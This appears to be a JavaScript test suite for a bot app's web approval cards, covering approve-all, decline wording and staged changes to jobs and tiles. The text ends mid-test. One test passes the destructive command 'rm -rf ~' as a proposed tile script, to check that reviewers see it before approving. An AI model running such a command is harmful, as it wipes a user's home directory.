// What the owner approves on the web page, and who asks them (SURE-003; docs/api.md, "Decline", "A change that
// waits", "What a bot proposed" and "A bot that asks"): the page's own code for the cards, cut out of
// public/app.js and run against stand-ins (test/need-cards.js), with the jobs, tiles and bots a botdot server of
// Milestone 8 sends, and one of before. "Approve all" takes no script; a no reads the server's words and asks
// nothing; a change to an approved job or tile has a card of its own; a bot that asks says so in the list.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const vm = require('vm');
const { app, read, cut, esc, element, whileBusy, words } = require('./web-page');
const { page, plain, titleOf, metaOf, thenOf, buttonsOf, CODER, NEWS, BAD } = require('./need-cards');
const Unread = require('../public/unread.js');

const css = read('style.css');
const text = (html) => html.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
// The blocks of a card's body, in order: [what goes, struck, or null; what comes, or null; 'pre' for a script].
const blocksOf = (html) => html.split('<div class="need-body').slice(1).map((chunk) => {
  const part = (cls) => chunk.match(new RegExp(`<(pre|div) class="nb${cls}">([\\s\\S]*?)</\\1>`));
  const was = part(' faint-strike'), now = part('');
  return [was ? was[2] : null, now ? now[2] : null, (was || now)[1]];
});
const untilOf = (html) => html.match(/<div class="need-meta need-until">([\s\S]*?)<\/div>/)?.[1] ?? null;
const alsoOf = (html) => [...html.matchAll(/<div class="need-meta need-also">([\s\S]*?)<\/div>/g)].map((m) => m[1]);

// Jobs as a bot's `jobs` have them. NEW and SCRIPT wait for their first OK; with `decline-words` they say `no`.
const NO = 'Decline and remove';
const AI = { id: 'j1', name: 'Morning news', kind: 'ai', cron: '0 8 * * *', when: 'Every day at 08:00', prompt: 'Send me the three biggest tech stories.', approved: false, enabled: true, changedBy: 'bot', no: NO };
const AI2 = { ...AI, id: 'j2', name: 'Price watch', when: 'Every day at 09:00', prompt: 'Check the price of the Lisbon flight.' };
const SCRIPT = { id: 'j3', name: 'Disk check', kind: 'script', cron: '0 * * * *', when: 'Every hour', script: 'df -h /mnt/backup | tail -1', aiWhen: 'output', prompt: '', approved: false, enabled: true, changedBy: 'bot', no: NO };
// An approved job with a change beside it (`staged-changes`): the job's own fields are the approved ones.
const APPROVED = { ...AI, approved: true, changedBy: undefined, no: undefined, notify: 'report-only', nextRunAt: '2026-10-08T06:00:00.000Z' };
const CHANGE = { name: 'Morning news', kind: 'ai', when: 'Every day at 07:00', cron: '0 7 * * *', once: null, prompt: 'Send me the five biggest tech stories and one from Poland.', script: '', notify: 'report-only', aiWhen: null, timeoutSeconds: 300, assessment: '', by: 'bot', at: '2026-10-07T09:00:00.000Z' };
const CHANGED = { ...APPROVED, change: CHANGE, no: 'Keep as it is', yes: 'Approve the change' };
const CHANGED_KEY = 'job:j1:change:2026-10-07T09:00:00.000Z';
const MEMORY = { id: 'm1', action: 'add', text: 'The owner flies from Brussels.', at: '2026-10-07T10:12:00.000Z', bot: NEWS, botId: 'news', title: 'Add to the shared memory', meta: 'after reading outside content', yes: 'Approve', no: 'Decline' };
const MEMORY2 = { ...MEMORY, id: 'm2', text: 'The owner reads Polish.' };
// A tile of `pending` in GET /api/dashboard, in full.
const TILE = { id: 't1', kind: 'value', title: 'Disk', section: 'Home', bot: 'coder', approved: false, changedBy: 'chief', read: { type: 'script', script: 'df -h / | tail -1' }, scripts: ['df -h / | tail -1'], no: NO };
const TILE_CHANGED = { ...TILE, approved: true, changedBy: undefined, no: 'Keep as it is', yes: 'Approve the change',
  change: { ...TILE, title: 'Disk', read: { type: 'script', script: 'df -h /mnt | tail -1' }, scripts: ['df -h /mnt | tail -1'], by: 'bot', at: '2026-10-07T09:30:00.000Z' } };
const withJobs = (...jobs) => [{ ...CODER, jobs }];
const open = (p) => p.needsItems();

// ---------- Approve all ----------

test('web: with AI jobs, a memory change and a script job waiting the button reads "Approve 3", approves those, and the script still waits, named in one line', async () => {
  const p = page({ state: { bots: withJobs(AI, AI2, SCRIPT), memPending: [MEMORY], view: 'needs' } });
  const all = p.approveAll(open(p));
  assert.equal(all.label, 'Approve 3');
  assert.deepEqual(plain(all.takes.map((x) => x.key)), ['job:j1', 'job:j2', 'mem:m1']);
  assert.equal(all.line, 'Disk check runs a script: approve it on its card.');
  // The page draws both: the button's label, and the line under the title.
  p.renderNeeds();
  assert.match(p.needsPage.innerHTML, /<h1>Needs you<\/h1><p class="needs-left">Disk check runs a script: approve it on its card\.<\/p><\/div>\s*<button class="btn primary" id="needs-all">Approve 3<\/button>/);
  assert.doesNotMatch(p.needsPage.innerHTML, /Approve all/);
  // What the button does: one answer for each it takes, and none for the script.
  for (const x of all.takes) await p.decide(x, true, false);
  assert.deepEqual(plain(p.calls.map(([url, , body]) => [url, body.approve])), [['/bots/coder/jobs/j1/approve', true], ['/bots/coder/jobs/j2/approve', true], ['/memory/pending/m1', true]]);
  assert.match(cut('function renderNeeds() {', '// The buttons on need cards'), /for \(const x of all\.takes\) await decide\(x, true, false\)/, 'the button approves what the label counts');
});

test('web: a job whose waiting change touches a script is left out the same way, and so is a tile', () => {
  const toScript = { ...CHANGED, id: 'j4', name: 'Backup', change: { ...CHANGE, kind: 'script', script: 'tar czf /mnt/b.tgz ~' } };
  const ofScript = { ...SCRIPT, id: 'j5', name: 'Uptime', approved: true, no: 'Keep as it is', yes: 'Approve the change', change: { ...CHANGE, kind: 'script', script: 'uptime', when: 'Every hour' } };
  const p = page({ state: { bots: withJobs(AI, CHANGED, toScript, ofScript), memPending: [MEMORY], dash: { pending: [TILE], suggestions: [] } } });
  const all = p.approveAll(open(p));
  assert.equal(all.label, 'Approve 3', 'a change in words is approved with the rest');
  assert.deepEqual(plain(all.takes.map((x) => x.key)), ['job:j1', CHANGED_KEY, 'mem:m1']);
  assert.equal(all.line, 'Backup, Uptime and “Disk” run scripts: approve them on their cards.');
  assert.equal(p.touchesScript(toScript), true);
  assert.equal(p.touchesScript(ofScript), true);
  assert.equal(p.touchesScript(CHANGED), false);
  // A change that carries a script without saying its kind counts as one that runs it, as in the Android app.
  assert.equal(p.touchesScript({ ...CHANGED, change: { ...CHANGE, kind: undefined, script: 'uptime' } }), true);
  assert.equal(p.touchesScript({ ...CHANGED, change: { ...CHANGE, script: '  ' } }), false);
});

test('web: with fewer than two things it would approve there is no button, and no line', () => {
  for (const [state, why] of [
    [{ bots: withJobs(SCRIPT, { ...SCRIPT, id: 'j6', name: 'Ping' }), dash: { pending: [TILE], suggestions: [] } }, 'only scripts'],
    [{ bots: withJobs(AI, SCRIPT) }, 'one AI job and a script'],
    [{ bots: withJobs(), memPending: [MEMORY] }, 'one memory change'],
    [{ bots: withJobs() }, 'nothing'],
  ]) {
    const p = page({ state: { view: 'needs', ...state } });
    assert.deepEqual(plain(p.approveAll(open(p))), { takes: [], label: '', line: '' }, why);
    p.renderNeeds();
    assert.doesNotMatch(p.needsPage.innerHTML, /needs-all|needs-left/, why);
  }
  const two = page({ state: { bots: withJobs(), memPending: [MEMORY, MEMORY2] } });
  assert.equal(two.approveAll(open(two)).label, 'Approve 2');
  assert.equal(two.approveAll(open(two)).line, '', 'nothing is left: no line');
});

test('web: what was answered on the page is not counted again', async () => {
  const p = page({ state: { bots: withJobs(AI, AI2), memPending: [MEMORY], view: 'needs' } });
  p.show('job:j1');
  await p.decide(p.item('job:j1'), true, false);
  p.renderNeeds();
  assert.match(p.needsPage.innerHTML, /id="needs-all">Approve 2</);
});

// ---------- Decline ----------

test('web: a job and a tile that wait for their first approval have the server\'s `no` on the button, and the card then reads the answer\'s `text`', async () => {
  const state = { bots: withJobs(AI, SCRIPT), dash: { pending: [TILE], suggestions: [] } };
  const p = page({ state, answer: (url) => (url.includes('/dashboard/') ? { ok: true, text: 'Declined and removed' } : { ok: true, removed: true, text: 'Declined and removed' }) });
  const tileKey = p.needsItems().find((x) => x.kind === 'tile').key;
  // On the Needs you page and in the chat: the same card.
  assert.deepEqual(buttonsOf(p.needCardHTML(p.item('job:j1'))), [NO, 'Always approve', 'Approve']);
  assert.deepEqual(buttonsOf(p.needCardHTML(p.item('job:j3'))), [NO, 'Always approve', 'Approve']);
  assert.deepEqual(buttonsOf(p.needCardHTML(p.item(tileKey))), [NO, 'Approve']);
  const chat = p.thread();
  p.updateChatNeeds(chat.thread, 'coder');
  assert.deepEqual(buttonsOf(chat.box.innerHTML), [NO, 'Always approve', 'Approve', NO, 'Always approve', 'Approve'], 'the bot\'s own jobs under its reply');
  for (const key of ['job:j1', tileKey]) {
    const card = p.show(key);
    await p.decide(p.item(key), false);
    assert.equal(card.actions.innerHTML, '<span class="muted">Declined and removed</span>', key);
  }
  // No browser question: the button says what it does.
  assert.equal(p.asksBeforeNo(p.item('job:j3')), false);
  const wiring = cut('function wireNeedCards(root, items) {', '// ---------- approvals in the chat');
  assert.match(wiring, /if \(no\) no\.onclick = \(\) => answerNeed\(x, false, no\);/, 'a card\'s no, as its row on the keypad answers it');
  assert.match(wiring, /if \(!asksBeforeNo\(x\) \|\| confirm\(tr\('Remove this job\?'\)\)\) return whileBusy\(button, tr\('Declining…'\), \(\) => decide\(x, false\)\);/);
});

test('web: the server\'s words are text, never markup', async () => {
  const p = page({ state: { bots: withJobs({ ...AI, no: BAD }) }, answer: () => ({ ok: true, removed: true, text: BAD }) });
  assert.ok(p.needCardHTML(p.item('job:j1')).includes(`data-need-no>${esc(BAD)}</button>`));
  const card = p.show('job:j1');
  await p.decide(p.item('job:j1'), false);
  assert.equal(card.actions.innerHTML, `<span class="muted">${esc(BAD)}</span>`);
});

test('web: against a server without `decline-words` the page behaves as before: "Decline", its own question, then "Declined"', async () => {
  const old = { ...AI, no: undefined };
  const tile = { ...TILE, no: undefined, scripts: undefined };
  const p = page({ state: { bots: withJobs(old), dash: { pending: [tile], suggestions: [] }, asks: [] }, answer: () => ({ ok: true, removed: true }) });
  const tileKey = p.needsItems().find((x) => x.kind === 'tile').key;
  assert.deepEqual(buttonsOf(p.needCardHTML(p.item('job:j1'))), ['Decline', 'Always approve', 'Approve']);
  assert.deepEqual(buttonsOf(p.needCardHTML(p.item(tileKey))), ['Decline', 'Approve']);
  assert.equal(p.asksBeforeNo(p.item('job:j1')), true, 'its no removes the job and the button does not say so');
  assert.equal(p.asksBeforeNo(p.item(tileKey)), false, 'a tile was never asked about');
  for (const no of [null, '', '  ', 7, { text: 'x' }]) assert.equal(p.asksBeforeNo({ kind: 'job', job: { ...AI, no } }), true, JSON.stringify(no));
  const card = p.show('job:j1');
  await p.decide(p.item('job:j1'), false);
  assert.equal(card.actions.innerHTML, '<span class="muted">Declined</span>');
  assert.equal(p.answeredWord(p.item(tileKey), true, false, { ok: true }), 'Approved');
  // A yes on a new job is "Approved", whatever the answer holds: the answer of a yes is the job.
  assert.equal(p.answeredWord({ kind: 'job', job: AI }, true, false, { ...AI, approved: true, text: 'Wants to add a job' }), 'Approved');
});

// ---------- A change ----------

test('web: a change with `summary` has that sentence on its card, and what goes and what comes behind the click', () => {
  const SAYS = 'Five stories instead of three, one of them from <b>Poland</b>, an hour earlier.';
  const p = page({ state: { bots: withJobs({ ...CHANGED, change: { ...CHANGE, summary: SAYS } }) } });
  const html = p.needCardHTML(p.item(CHANGED_KEY));
  assert.ok(html.includes(`<div class="need-summary">${esc(SAYS)}</div>`), 'as text, never as markup');
  assert.match(html, /<div class="card need-card need-changed need-summed" data-need=/);
  // The schedule line, the buttons and the blocks are as on any change; the blocks are inside what a closed card leaves out.
  assert.equal(metaOf(html), 'now Every day at 08:00 → Every day at 07:00 · uses AI · changed by itself');
  assert.deepEqual(buttonsOf(html), ['Keep as it is', 'Always approve', 'Approve the change']);
  assert.deepEqual(blocksOf(html), [['Send me the three biggest tech stories.', 'Send me the five biggest tech stories and one from Poland.', 'div']]);
  const full = html.indexOf('<div class="need-full">');
  assert.ok(html.indexOf('need-summary') < full && full < html.indexOf('<div class="need-body') && html.indexOf('need-until') > full);
  assert.match(css, /\.need-full \{ display: contents; \}\n\.need-card:not\(\.open\) \.need-full \{ display: none; \}/, 'closed, the sentence stands for them');
  assert.match(css, /\.need-card\.open \.need-more \{ display: none; \}/);
  // A change without one, a sentence that is no text, and a job before its first OK: the card as before.
  for (const job of [CHANGED, { ...CHANGED, change: { ...CHANGE, summary: { no: 'text' } } }, { ...CHANGED, change: { ...CHANGE, summary: '  ' } }]) {
    const plainCard = page({ state: { bots: withJobs(job) } });
    assert.doesNotMatch(plainCard.needCardHTML(plainCard.item(CHANGED_KEY)), /need-summ|need-full|need-more/);
  }
});

test('web: a job with `change` has a card titled "<name>: a change", with both schedules, the approved text struck above the new one, and the line that it runs as approved', () => {
  const p = page({ state: { bots: withJobs(CHANGED) } });
  const html = p.needCardHTML(p.item(CHANGED_KEY));
  assert.equal(titleOf(html), 'Morning news: a change');
  assert.equal(metaOf(html), 'now Every day at 08:00 → Every day at 07:00 · uses AI · changed by itself');
  assert.deepEqual(blocksOf(html), [['Send me the three biggest tech stories.', 'Send me the five biggest tech stories and one from Poland.', 'div']]);
  assert.equal(untilOf(html), 'Runs as you approved it until you answer.');
  assert.deepEqual(buttonsOf(html), ['Keep as it is', 'Always approve', 'Approve the change']);
  // Both schedules are in one line: on a closed card it wraps, so that the new one is never cut at a phone's width.
  assert.match(html, /<div class="card need-card need-changed" data-need=/);
  assert.match(css, /\.need-card\.need-changed:not\(\.open\) \.need-meta \{ white-space: normal; \}/);
  const fresh = page({ state: { bots: withJobs(AI) } });
  assert.doesNotMatch(fresh.needCardHTML(fresh.item('job:j1')), /need-changed/, 'a new job\'s card is as before');
  assert.match(css, /\.need-meta\.need-until \{ color: var\(--text\); \}/, 'the line is in the text\'s colour');
  assert.match(css, /\.need-card:not\(\.open\) \.need-meta\.need-until \{ white-space: normal; \}/, 'and whole on a closed card, at any width');
});

test('web: a field that did not change is drawn once: the same text, the same schedule, a field the server left out', () => {
  const draw = (job) => { const p = page({ state: { bots: withJobs(job) } }); return p.needCardHTML(p.item(CHANGED_KEY)); };
  const time = draw({ ...CHANGED, change: { ...CHANGE, prompt: APPROVED.prompt } });
  assert.deepEqual(blocksOf(time), [[null, APPROVED.prompt, 'div']], 'only the time changes: the text stands once, not struck');
  assert.equal(metaOf(time), 'now Every day at 08:00 → Every day at 07:00 · uses AI · changed by itself');
  const words = draw({ ...CHANGED, change: { ...CHANGE, when: APPROVED.when, by: 'chief' } });
  assert.equal(metaOf(words), 'Every day at 08:00 · uses AI · changed by the Chief');
  const bare = draw({ ...CHANGED, no: undefined, yes: undefined, change: { by: 'bot', at: CHANGE.at } });
  assert.equal(metaOf(bare), 'Every day at 08:00 · uses AI · changed by itself');
  assert.deepEqual(blocksOf(bare), [[null, APPROVED.prompt, 'div']]);
  assert.deepEqual(buttonsOf(bare), ['Keep as it is', 'Always approve', 'Approve the change'], 'a change without the words never reads "Decline"');
  const more = draw({ ...CHANGED, change: { ...CHANGE, name: 'Early news', notify: 'always', assessment: 'Earlier, as you asked.' } });
  assert.equal(metaOf(more), 'now Every day at 08:00 → Every day at 07:00 · renamed “Early news” · uses AI · changed by itself');
  assert.deepEqual(alsoOf(more), ['Tells you: only when it has something to report → after every run']);
  assert.match(more, /<div class="job-why">Earlier, as you asked\.<\/div>/);
});

test('web: both scripts where the script changes; a job that becomes a script shows the one it would run', () => {
  const approved = { ...SCRIPT, approved: true, no: 'Keep as it is', yes: 'Approve the change' };
  const draw = (job) => { const p = page({ state: { bots: withJobs(job) } }); return p.needCardHTML(p.needsItems()[0]); };
  const changed = draw({ ...approved, change: { ...CHANGE, name: 'Disk check', kind: 'script', when: 'Every hour', script: 'df -h /mnt/data | tail -1', prompt: '', aiWhen: 'failed' } });
  assert.equal(titleOf(changed), 'Disk check: a change');
  assert.equal(metaOf(changed), 'Every hour · a script, no AI · changed by itself');
  assert.deepEqual(blocksOf(changed), [['df -h /mnt/backup | tail -1', 'df -h /mnt/data | tail -1', 'pre']]);
  assert.deepEqual(alsoOf(changed), ['Asks the AI: only when it prints something → only when it fails']);
  const toScript = draw({ ...CHANGED, change: { ...CHANGE, kind: 'script', script: 'curl -fsS https://news.example', prompt: 'Sum it up.', aiWhen: 'output' } });
  assert.equal(metaOf(toScript), 'now Every day at 08:00 → Every day at 07:00 · a script, no AI · changed by itself');
  assert.deepEqual(blocksOf(toScript), [['Send me the three biggest tech stories.', 'Sum it up.', 'div'], [null, 'curl -fsS https://news.example', 'pre']], 'what changes stands first');
  const toAi = draw({ ...approved, change: { ...CHANGE, kind: 'ai', when: 'Every hour', script: '', prompt: 'Look at the disk.' } });
  assert.deepEqual(blocksOf(toAi), [['df -h /mnt/backup | tail -1', null, 'pre'], [null, 'Look at the disk.', 'div']], 'the script that goes is struck');
  assert.match(css, /\.need-card:not\(\.open\) \.need-change pre\.faint-strike \{ -webkit-line-clamp: 2; \}/, 'closed, the card shows the start of both');
});

test('web: a script job\'s card lists its logins, and a change the list it was and the list it becomes (ADR 085)', () => {
  const draw = (job) => { const p = page({ state: { bots: withJobs(job) } }); return p.needCardHTML(p.needsItems()[0]); };
  assert.deepEqual(alsoOf(draw({ ...SCRIPT, logins: ['GitHub token', 'Proxmox'] })), ['Logins: GitHub token, Proxmox']);
  assert.deepEqual(alsoOf(draw(SCRIPT)), [], 'none: no line');
  const approved = { ...SCRIPT, logins: ['GitHub token'], approved: true, no: 'Keep as it is', yes: 'Approve the change' };
  const change = (c) => ({ ...approved, change: { ...CHANGE, name: 'Disk check', kind: 'script', when: 'Every hour', script: approved.script, prompt: '', aiWhen: 'output', ...c } });
  assert.deepEqual(alsoOf(draw(change({ logins: ['GitHub token', 'Proxmox'] }))), ['Logins: GitHub token → GitHub token, Proxmox']);
  assert.deepEqual(alsoOf(draw(change({}))), ['Logins: GitHub token → none']);
  assert.deepEqual(alsoOf(draw(change({ logins: ['GitHub token'] }))), [], 'the same list: no line');
  assert.deepEqual(alsoOf(draw(change({ kind: 'ai', script: '', prompt: 'Look.' }))), [], 'an AI job has none');
});

test('web: a closed card shows what changes: the block that changes stands first, and what else changes above the blocks', () => {
  const approved = { ...SCRIPT, prompt: 'Tell me when it is over 90%.', approved: true, notify: 'report-only', no: 'Keep as it is', yes: 'Approve the change' };
  const draw = (change) => { const p = page({ state: { bots: withJobs({ ...approved, change: { ...CHANGE, name: 'Disk check', kind: 'script', when: 'Every hour', script: approved.script, prompt: approved.prompt, aiWhen: 'output', ...change } }) } }); return p.needCardHTML(p.needsItems()[0]); };
  // Only the AI's text changes: a closed card shows one block, and it is that one, not the script that stays.
  const words = draw({ prompt: 'Tell me when it is over 80%.' });
  assert.deepEqual(blocksOf(words), [['Tell me when it is over 90%.', 'Tell me when it is over 80%.', 'div'], [null, 'df -h /mnt/backup | tail -1', 'pre']]);
  assert.match(css, /\.need-card:not\(\.open\) \.need-body ~ \.need-body, \.need-card:not\(\.open\) \.job-why \{ display: none; \}/, 'the later blocks are behind the click');
  // Only a setting changes: its line stands above the blocks, where no rule hides it.
  const setting = draw({ notify: 'always', aiWhen: 'always' });
  assert.deepEqual(alsoOf(setting), ['Tells you: only when it has something to report → after every run', 'Asks the AI: only when it prints something → every time it runs']);
  assert.ok(setting.indexOf('need-also') < setting.indexOf('need-body'), 'above the blocks');
  assert.doesNotMatch(css, /:not\(\.open\)[^{]*\.need-also[^{]*\{[^}]*display: none/);
  // A tile whose second script changes: that pair first.
  const p = page({ state: { bots: [CODER], dash: { pending: [{ ...TILE_CHANGED, scripts: ['a', 'b'], change: { ...TILE_CHANGED.change, scripts: ['a', 'c'] } }], suggestions: [] } } });
  assert.deepEqual(blocksOf(p.needCardHTML(p.needsItems()[0])), [['b', 'c', 'pre'], [null, 'a', 'pre']]);
});

test('web: a change\'s buttons read the server\'s `no` and `yes`, and after an answer the card reads the answer\'s `text`', async () => {
  for (const [yes, answer, label] of [
    [false, { ok: true, kept: true, text: 'Kept as it was: Every day at 08:00' }, 'Kept as it was: Every day at 08:00'],
    [true, { ...APPROVED, ...CHANGE, text: 'Changed: Every day at 07:00' }, 'Changed: Every day at 07:00'],
    [true, { ...APPROVED, text: 'Changed: Every day at 07:00', carriesOn: { who: 'bot', text: 'it carries on' } }, 'Changed: Every day at 07:00 · it carries on'],
    [true, { ...APPROVED }, 'Approved'], // a server that sends no words
    [false, { ok: true }, 'Declined'],
  ]) {
    const p = page({ state: { bots: withJobs({ ...CHANGED, no: 'Keep it', yes: 'Change it' }) }, answer: () => answer });
    assert.deepEqual(buttonsOf(p.needCardHTML(p.item(CHANGED_KEY))), ['Keep it', 'Always approve', 'Change it']);
    const card = p.show(CHANGED_KEY, 'coder', 'Morning news: a change');
    await p.decide(p.item(CHANGED_KEY), yes);
    assert.deepEqual(plain(p.calls), [['/bots/coder/jobs/j1/approve', 'POST', { approve: yes, always: false }]]);
    assert.equal(card.actions.innerHTML, `<span class="muted">${label}</span>`);
    assert.equal(p.asksBeforeNo(p.item(CHANGED_KEY)), false, 'the no keeps the job: nothing to ask');
    assert.deepEqual(plain([...p.chatDecided.values()]), [{ scope: 'coder', title: 'Morning news: a change', label }]);
  }
  assert.match(cut('async function decide(x, yes', 'async function refreshNeeds() {'), /\$\('\.need-until', el\)\?\.remove\(\);/, 'the line that it runs as approved goes with the answer');
});

test('web: a change is in Needs you, in the banner\'s list, under the bot\'s reply and under the Chief\'s where the Chief asked, like any waiting job', () => {
  const p = page({ state: { bots: withJobs(CHANGED, { ...APPROVED, id: 'j9', name: 'Runs on' }), view: 'needs' } });
  assert.deepEqual(plain(p.needsItems().map((x) => x.key)), [CHANGED_KEY], 'the banner and the page draw the same list; an approved job without a change is not in it');
  assert.equal(p.jobWaits(CHANGED), true);
  assert.equal(p.jobWaits(APPROVED), false);
  p.renderNeeds();
  assert.equal(titleOf(p.needsPage.innerHTML), 'Morning news: a change');
  assert.deepEqual(plain(p.chatNeeds('coder').map((x) => x.key)), [CHANGED_KEY], 'the bot changed its own job: in its chat');
  assert.deepEqual(plain(p.chatNeeds('chief')), []);
  const chiefs = page({ state: { bots: withJobs({ ...CHANGED, change: { ...CHANGE, by: 'chief' } }) } });
  assert.deepEqual(plain(chiefs.chatNeeds('chief').map((x) => x.key)), [CHANGED_KEY], 'the Chief asked: in the Chief\'s chat');
  assert.deepEqual(plain(chiefs.chatNeeds('coder')), []);
  // A second change takes the first one's place on one card, and is drawn again.
  const box = p.thread();
  p.updateChatNeeds(box.thread, 'coder');
  assert.match(box.box.innerHTML, /five biggest/);
  p.state.bots = withJobs({ ...CHANGED, change: { ...CHANGE, prompt: 'Send me ten.', at: '2026-10-07T09:05:00.000Z' } });
  p.updateChatNeeds(box.thread, 'coder');
  assert.match(box.box.innerHTML, /Send me ten\./);
  assert.doesNotMatch(box.box.innerHTML, /five biggest/);
  assert.equal(p.needsItems().length, 1);
});

test('web: `change` on a job that is not approved, or one that is no object, is no change: the job waits whole, as before', () => {
  const p = page({ state: { bots: withJobs({ ...AI, change: CHANGE }, { ...APPROVED, id: 'j7', change: true }, { ...APPROVED, id: 'j8', change: null }) } });
  assert.deepEqual(plain(p.needsItems().map((x) => x.key)), ['job:j1']);
  assert.equal(titleOf(p.needCardHTML(p.item('job:j1'))), 'Morning news');
  assert.deepEqual(buttonsOf(p.needCardHTML(p.item('job:j1'))), [NO, 'Always approve', 'Approve']);
});

test('web: a tile with `change` has the same card with its scripts, and its answers read the server\'s words', async () => {
  const p = page({ state: { bots: [CODER], dash: { pending: [TILE_CHANGED], suggestions: [] } }, answer: () => ({ ok: true, kept: true, text: 'Kept as it was: Disk' }) });
  const x = p.needsItems()[0];
  assert.equal(x.key, 't1'.replace(/^/, 'tile:') + `:${'df -h / | tail -1'.length}:change:2026-10-07T09:30:00.000Z`);
  const html = p.needCardHTML(x);
  assert.equal(titleOf(html), 'Disk: a change');
  assert.equal(metaOf(html), 'Home · a script, no AI · changed by itself');
  assert.deepEqual(blocksOf(html), [['df -h / | tail -1', 'df -h /mnt | tail -1', 'pre']]);
  assert.equal(untilOf(html), 'Runs as you approved it until you answer.');
  assert.deepEqual(buttonsOf(html), ['Keep as it is', 'Approve the change']);
  assert.deepEqual(plain(p.chatNeeds('coder').map((i) => i.key)), [x.key], 'a bot\'s change stands in its chat');
  const card = p.show(x.key);
  await p.decide(x, false);
  assert.deepEqual(plain(p.calls), [['/dashboard/tiles/t1/approve', 'POST', { approve: false }]]);
  assert.equal(card.actions.innerHTML, '<span class="muted">Kept as it was: Disk</span>');
  assert.equal(p.answeredWord(x, true, false, { ok: true, text: 'Changed: Disk' }), 'Changed: Disk');
  // Several scripts: each that changes with what it was, each that stays once; one that is new alone.
  const many = p.tileCard({ ...TILE_CHANGED, scripts: ['a', 'b'], change: { ...TILE_CHANGED.change, title: 'Disks', scripts: ['a', 'c', 'd'], by: 'chief' } });
  assert.deepEqual(plain([many.title, many.meta, many.scriptsWas, many.scripts]), ['Disk: a change', 'Home · renamed “Disks” · a script, no AI · changed by the Chief', ['a', 'b'], ['a', 'c', 'd']]);
  // A change that lists no scripts: those of the tile as proposed are read from its sources, never the approved ones.
  const unlisted = p.tileCard({ ...TILE_CHANGED, change: { ...TILE_CHANGED.change, scripts: undefined, read: { type: 'script', script: 'rm -rf ~' } } });
  assert.deepEqual(plain([unlisted.scriptsWas, unlisted.scripts]), [['df -h / | tail -1'], ['rm -rf ~']]);
  const same = p.tileCard({ ...TILE_CHANGED, change: { ...TILE_CHANGED.change, scripts: TILE_CHANGED.scripts } });
  assert.deepEqual(plain(same.scriptsWas), [], 'scripts that stay are drawn once');
});

test('web: a waiting job, a suggested tile and a changed bot with `then` say who carries on, as a permission card does', async () => {
  const THEN = { who: 'bot', text: 'Coder carries on when you approve it.' };
  const sug = { id: 's1', bot: 'coder', reason: 'You asked for the disk.', at: '2026-10-07T09:00:00.000Z', then: THEN, tile: { kind: 'value', title: 'Disk', scripts: ['df -h /'] } };
  const ask = { id: 'b1', kind: 'bot-change', botId: 'coder', bot: CODER, by: 'bot', title: 'Change its instructions', reason: 'To do it right', details: 'x', then: THEN };
  const p = page({ state: { bots: withJobs({ ...AI, then: THEN }, { ...CHANGED, id: 'j2', then: THEN }), asks: [ask], dash: { pending: [], suggestions: [sug] } }, answer: () => ({ ok: true, tile: {}, carriesOn: { who: 'bot', text: 'it carries on' } }) });
  const cards = p.chatNeeds('coder');
  assert.deepEqual(plain(cards.map((x) => x.kind)), ['tilesug', 'job', 'job', 'ask']);
  for (const x of cards) assert.equal(thenOf(p.needCardHTML(x)), THEN.text, x.key);
  const html = p.needCardHTML(p.item(`job:j2:change:${CHANGE.at}`));
  assert.ok(html.indexOf('need-until') < html.indexOf('need-then'), 'a change says that it runs as approved, then who carries on');
  // The yes on a suggested tile says that the bot carries on.
  const card = p.show('tsug:s1', 'coder');
  await p.decide(cards[0], true);
  assert.equal(card.actions.innerHTML, '<span class="muted">On your Board · it carries on</span>');
  const none = page({ state: { bots: [CODER], dash: { pending: [], suggestions: [{ ...sug, then: undefined }] } } });
  assert.equal(thenOf(none.needCardHTML(none.chatNeeds('coder')[0])), null, 'a server that says nothing: no line');
});

// ---------- The jobs panel and the job dialog ----------

// The page's code for a job in the jobs panel, and for the dialog of one waiting job.
function panel() {
  const opened = [], toasts = [], calls = [];
  const modal = element({ '#job-approve': element(), '#job-decline': element() }, { close() { modal.closed = true; } });
  const ctx = vm.createContext({
    ...words, esc, state: { bots: [], botId: 'coder' }, CRON_PRESETS: [], OpeningLine: { text: (t) => (typeof t === 'string' ? t.trim() : '') }, ago: () => 'just now', shortTime: () => '08:00',
    botById: (id) => ctx.state.bots.find((b) => b.id === id), ToolCard: { is: () => false }, tileScripts: () => [],
    openModal: (html) => { opened.push(html); return modal; }, toast: (t) => toasts.push(t), refresh() {}, whileBusy,
    // GET /api/bots/:id/jobs before a yes: the jobs as the server has them now (ctx.jobs; none set: no list).
    api: async (url, opts) => { if (!opts) return ctx.jobs; calls.push([url, opts.body]); return ctx.answer; },
    $: (sel, root) => root.querySelector(sel),
  });
  vm.runInContext(`${cut('const AI_WHEN_TEXT = {', 'const readJob = ')}
    ${cut('// Jobs waiting for the owner\'s OK', '// ---------- connectors (apps through Composio)')}
    ${cut('// Words of the server\'s that a card draws', '// Who carries on after a yes')}
    this.page = { jobStatus, jobCardHTML, jobChangeNote, drawJobChange, jobLineSig, openJobApproval };`, ctx);
  return { ...ctx.page, ctx, opened, toasts, calls, modal };
}

test('web: the jobs panel shows a job with a change as running, with "A change waits for your OK" and the way to its card', () => {
  const p = panel();
  assert.equal(p.jobStatus(CHANGED), '<span class="pill">next 08:00</span>', 'its pill is the approved job\'s: it runs');
  const html = p.jobCardHTML(CHANGED);
  assert.match(html, /<div class="job-body">\s*<div class="req-note job-change">A change waits for your OK\. Runs as you approved it until you answer\. <button type="button" class="btn sm primary" data-review>Review the change<\/button><\/div>/);
  assert.match(html, /<details class="job-card" [^>]* open>/, 'its card is open: the note is seen');
  assert.doesNotMatch(html, /set this up, so it waits for your OK before it runs/);
  assert.match(html, /name="jobPrompt" rows="3" placeholder="[^"]*">Send me the three biggest tech stories\.</, 'the fields are the approved job\'s');
  assert.equal(p.jobChangeNote(APPROVED), '');
  assert.doesNotMatch(p.jobCardHTML(APPROVED), /job-change|<details class="job-card" [^>]* open>/);
  assert.match(p.jobCardHTML({ ...AI, changedBy: 'bot' }), /The bot set this up, so it waits for your OK before it runs\./, 'a job before its first OK is as before');
  assert.notEqual(p.jobLineSig(CHANGED), p.jobLineSig(APPROVED), 'an open panel follows a change that comes or goes');
  // The note follows the job: it goes with the answer, and "Review the change" opens the dialog of the change as it is now.
  const note = element();
  const review = {};
  const body = { insertAdjacentHTML(where, h) { body.put = [where, h]; } };
  const card = element({ '.job-change': note, '.job-body': body, '[data-review]': review }, { dataset: { job: 'j1' } });
  p.drawJobChange(card, APPROVED);
  assert.equal(note.removed, true);
  assert.equal(body.put, undefined);
